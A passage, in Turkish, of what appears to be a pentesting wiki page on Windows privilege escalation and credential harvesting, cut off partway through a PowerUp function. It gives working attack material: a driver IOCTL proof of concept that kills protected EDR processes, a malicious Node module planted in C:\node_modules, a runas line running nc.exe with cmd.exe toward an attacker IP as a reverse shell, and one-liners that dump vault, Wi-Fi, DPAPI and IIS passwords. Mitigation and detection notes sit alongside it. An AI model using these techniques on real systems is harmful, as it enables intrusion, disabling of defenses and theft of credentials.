Modern hive güvenlik açıkları, deterministik düzenler oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata bozulmasını kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tam zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan denetimindeki yollarla `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path kabul eder, bunun yalnızca geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını, `int readValue` gibi bir stack scalar'ına `RTL_QUERY_REGISTRY_DIRECT` yazarak yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği türe göre değil, **gerçek** registry türüne göre yorumlanır.

Bu, kullanışlı iki primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı denetimindeki mutlak bir `\Registry\...` yolu, driver'ın saldırganın seçtiği anahtarları sorgulamasına, dönüş kodları/loglar aracılığıyla anahtarların varlığını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel bellek bozulması**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_DIRECT` ile ancak `RTL_QUERY_REGISTRY_TYPECHECK` olmadan bir **untrusted hive**'a erişirse, kernel çağıranlarda `KERNEL_SECURITY_CHECK_FAILURE (0x139)` hatası oluşur. Exploit edilebilirliği korumak için değerleri `HKCU` altında hazırlamak yerine **trusted system hive'larındaki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı kopyalanmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte `int` içine yapılan 8-byte doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD` değerini stack scalar'ına yükler ve ardından bu aynı buffer'ı string read için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrol edilebilir bir kernel write elde eder.
- **`REG_BINARY`**: büyük binary data için direct mode, `EntryContext`'teki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` read, yeniden kullanılan scalar'da saldırganın kontrolündeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` query saldırganın byte'larını bitişik stack slot'larının üzerine doğrudan kopyalar; bu, callback pointer'ının tamamen üzerine yazmanın genellikle en kolay yoludur.

Güçlü bir hunting pattern: **aynı stack variable'a yeniden başlatmadan yapılan heterojen registry read'leri**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'ler için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı third-party driver'lar IoCreateDeviceSecure ile güçlü bir SDDL kullanarak device object'lerini oluşturur, ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadığında, device fazladan bir bileşen içeren bir path üzerinden açıldığında secure DACL uygulanmaz; böylece herhangi bir ayrıcalıksız kullanıcı aşağıdaki gibi bir namespace path kullanarak handle alabilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Bir kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- Keyfi process'lere full-access handle döndürme (DuplicateTokenEx/CreateProcessAsUser ile token theft / SYSTEM shell).
- Kısıtlanmamış raw disk read/write (offline tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil keyfi process'leri terminate etme; böylece kernel üzerinden user land'den AV/EDR kill mümkün olur.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan aygıt nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlemin sonlandırılmasına veya handle döndürülmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli aygıt adlarının (ör. \\ .\\amsdk*) kullanıcı modundan açılmasını ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft'un güvenlik açığı bulunan sürücü engelleme listesini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/engelleme listelerinizi tutun.


## PATH DLL Hijacking

**PATH'te bulunan bir klasörün içinde yazma izinleriniz** varsa, bir süreç tarafından yüklenen bir DLL'i ele geçirebilir ve **ayrıcalıkları yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu denetimin nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, `require("foo")` gibi yalın bir import gerçekleştiren ve beklenen modülün **bulunamadığı** durumlarda **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü kök dizinine kadar ulaşabilir. Bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şu yolları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı içinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- Bir bağımlılık `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- Üçüncü taraf bir kütüphane `require("foo")` ifadesini `try/catch` içine alıp hata durumunda çalışmaya devam ettiğinde
- Bir paket üretim derlemelerinden kaldırıldığında, paketleme sırasında atlandığında veya yüklenemediğinde
- Güvenlik açığı bulunan `require()` ana uygulama kodunda değil, bağımlılık ağacının derinlerinde bulunduğunda

### Güvenlik açığı bulunan hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef yürütülebilir dosyaya (`node.exe`, Electron uygulamasının EXE dosyası veya sarmalayıcı süreci) ayarlayın
- `Path` filtresinde `node_modules` ifadesini arayın
- `NAME NOT FOUND` kayıtlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketleri açılmış `.asar` dosyalarında veya uygulama kaynaklarında kullanışlı kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesi üzerinden **eksik paket adını** belirleyin.
2. Henüz mevcut değilse kök arama dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen tam ada sahip bir modül bırak:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül yoksa Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada kullanılan eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleneceği herhangi bir **eksik bare import** bulun.

### Tespit ve sağlamlaştırma önerileri

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini inceleyin.
- Kütüphane destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin bazı `ws` dağıtımları, `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` kontrolünden kaçınabilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi işlemin sahibi, çalıştırılabilir dosya yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir uzaktan kontrol hizmeti, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklara sahip bir hesap altında çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve ikili dosya yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolu ise tam olarak o ikili dosyanın ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir bağlantı noktası bir sistem işlemine ait görünüyorsa arka uç hizmetini ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) ile karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ keşfi için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` dosyası `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısını elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc` uygulamasına güvenlik duvarı tarafından izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı, tek başına Windows Administrator hakları sağlamaz. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin; ayrıcalık yükseltme için yine de geçerli bir yüksek ayrıcalıklı hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2 genellikle dağıtımı bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) depolar. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş içeriklerini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde bulunan bir düz metin paroladır. `AutoAdminLogon=1` olduğu hâlde okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı bir LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini olağan şekilde okumak, bu secret'ın var olup olmadığını veya alınıp alınamayacağını ortaya koymaz. Bir kimlik bilgisi ifşası bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un kullanıcıları **otomatik olarak oturum açtırmak** için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyormuş gibi gelebilir, ancak çalışma şekli böyle değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini saklar. Bu, **bir kaynağa (sunucuya veya web sitesine) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** bu Credential Manager ve Windows Vault'tan **yararlanabileceği** ve kullanıcıların her seferinde kullanıcı adı ile parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşim kurmadığı sürece, belirli bir kaynağın kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynağa ait kimlik bilgilerini istemek için bir şekilde **credential manager ile iletişim kurmalıdır**.

Makinede kayıtlı kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından, kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla da kullanılabileceğini unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token'larını ve düz metin parolaları Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` aracında `Web Credentials` olarak da görüntülenir). Bu depolama alanı oturum bazında yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Saklanan tüm kullanıcı adlarını ve düz metin parolaları anında dökmek ve çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve çoğunlukla Windows işletim sisteminde asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için kullanıcıya veya sisteme ait bir sırdan yararlanır.

**DPAPI, kullanıcı oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesinin söz konusu olduğu senaryolarda, sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eden `{SID}` ile birlikte `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Kullanıcının özel anahtarlarını koruyan ana anahtarla aynı dosyada bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'de `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Bunu şifre çözmek için uygun argümanlarla (`/pvk` veya `/rpc`) **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**Ana parola ile korunan kimlik bilgisi dosyaları** genellikle şurada bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Uygun `/masterkey` ile şifreyi çözmek için **mimikatz modülü** `dpapi::cred` kullanılabilir.\
(root yetkisine sahipseniz) `sekurlsa::dpapi` modülüyle **bellekten** birçok **DPAPI** **masterkey** çıkarabilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini kullanışlı bir şekilde saklamak için **betik yazma** ve otomasyon görevlerinde sıkça kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları aynı bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılan bir kimlik bilgisi rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir betik ya da dosya envanteri böyle bir dosyaya işaret ettiğinde, `C:\Users` varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette ayrıca geçerli haklara sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL'leri inceleyin.

İçinde kimlik bilgisinin bulunduğu dosyadaki bir PS kimlik bilgisinin **şifresini çözmek** için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use **Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **.rdg dosyalarının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Documents klasöründeki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgileri için ipucu olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan ve düz metin olduğunu varsaymadan, kimlik bilgileri için bir ipucu olarak değerlendirin: [satıcı notlarında](https://www.donkz.nl/) profil korumasının profili oluşturan hesaba ve bilgisayara bağlanabileceği veya daha gevşek şekilde yapılandırılabileceği belirtiliyor. Buna güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar Windows iş istasyonlarında StickyNotes uygulamasını çoğu zaman **parola** ve başka bilgileri kaydetmek için kullanır; bunun bir veritabanı dosyası olduğunun farkında olmayabilir. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

Kullanıcılar bazen parola ve başka bilgileri not uygulamalarına kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması genellikle notları `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar LevelDB dahil başka kullanıcı profili depolarını kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığının kanıtı saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa yalnızca `plum.sqlite` dosyasının kopyalanması, yakın zamanda kaydedilmiş notları içermeyebilir. `plum.sqlite-wal` dosyasını veritabanının tutarlı bir kopyasıyla birlikte saklayın ve varsa `plum.sqlite-shm` dosyasını da ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. Bkz. [SQLite'ın WAL belgeleri](https://www.sqlite.org/wal.html). Hesap adı veya parola içeren bir not yalnızca kimlik bilgileri için bir ipucudur: daha yüksek ayrıcalıklı bir oturum açmayı kanıtlamadan önce hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir password-manager kaydının daha yüksek ayrıcalıklı oturum açmayı kanıtlayabilmesi için ayrıca gerçek şifre çözme anahtarı ve uygulamaya özgü yorumlama gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
